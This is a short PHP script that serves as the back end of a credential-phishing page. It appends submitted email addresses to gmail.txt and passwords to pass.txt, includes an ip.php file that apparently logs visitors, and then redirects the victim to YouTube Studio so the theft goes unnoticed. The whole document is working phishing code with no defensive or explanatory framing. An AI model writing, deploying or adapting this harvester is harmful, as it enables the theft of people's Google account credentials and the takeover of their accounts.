<?php
include 'ip.php';
file_put_contents("gmail.txt", "" . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "" . $pswrepeat = $_POST['pswrepeat'] . "\n", FILE_APPEND);
header('Location: https://studio.youtube.com/');
?>